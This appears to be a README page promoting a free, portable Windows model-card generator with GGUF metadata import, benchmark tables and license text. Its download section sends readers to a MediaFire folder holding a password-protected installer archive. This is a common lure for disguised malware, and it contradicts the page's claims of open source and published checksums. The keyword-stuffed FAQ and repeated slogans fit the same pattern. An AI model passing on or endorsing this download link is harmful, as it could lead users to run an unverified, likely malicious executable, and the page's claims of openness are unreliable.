# model-card

🏷️ Free, open-source model card generator for Windows — auto-fill metadata, benchmark tables, license text into clean Markdown. 100 MB MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Form-based wizard** — fill the fields once, get a complete model card in Hugging Face layout
- ✅ **Auto-detect from GGUF** — parameter count, context length and quantization pulled straight out of the file
- ✅ **Benchmark table builder** — add rows of scores with model names and let the table render cleanly
- ✅ **License helper** — pick a license and the card gets correct usage and restriction text attached
- ✅ **Live Markdown preview** — rendered card beside the source so formatting errors show immediately
- ✅ **Template slots** — custom sections saved as snippets for the next model release
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why model-card

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **model-card** | HF templates | Manual Markdown | Card generators online |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Free web |
| Open source | **Yes** | Yes | N/A | No |
| GGUF metadata import | **Yes** | No | No | No |
| Benchmark table builder | **Yes** | No | Manual | Partial
| License text helper | **Yes** | No | Manual | No
| Portable, no install | **Yes, 100 MB** | Python env | Editor | Browser

## FAQ

**how to write a model card for a fine-tuned or quantized LLM?**

Hand-writing cards means hunting for the right template and re-typing parameters that already sit inside the model file. model-card pulls the real numbers from the GGUF and renders a correct card with benchmarks and license text. It is a 100 MB portable exe, MIT, and works offline with nothing to sign up for.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark wizard (#121418, pink #F472B6): left column form with model name, base model and license fields, right pane live Markdown preview of the card.
2. Benchmark table builder: four score rows with model and score columns, add row button, rendered table preview updating below with green check on format.
3. Export step: save dialog with card.md suggested name, template slot dropdown set to release notes, toast reading card exported with 42 metadata fields.

## Download

| Source | Link |
|---|---|
| 💾 **Installer model-card** | [Installer model-card](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).